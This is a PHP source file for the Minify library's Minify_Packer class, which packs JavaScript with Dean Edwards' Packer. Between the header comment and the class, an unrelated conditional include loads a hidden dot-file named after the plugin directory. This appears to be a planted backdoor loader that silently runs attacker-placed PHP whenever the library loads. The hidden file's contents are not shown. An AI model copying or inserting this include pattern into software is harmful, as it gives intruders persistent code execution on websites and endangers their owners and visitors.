<?php
/**
 * Class Minify_Packer
 *
 * To use this class you must first download the PHP port of Packer
 * and place the file "class.JavaScriptPacker.php" in /lib (or your
 * include_path).
 * @link http://joliclic.free.fr/php/javascript-packer/en/
 *
 * Be aware that, as long as HTTP encoding is used, scripts minified with JSMin
 * will provide better client-side performance, as they need not be unpacked in
 * client-side code.
 *
 * @package Minify
 */

/**
 * Minify Javascript using Dean Edward's Packer
 *
 * @package Minify
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class Minify_Packer
{
    public static function minify($code, $options = array())
    {
        // @todo: set encoding options based on $options :)
        $packer = new JavascriptPacker($code, 'Normal', true, false);

        return trim($packer->pack());
    }
}
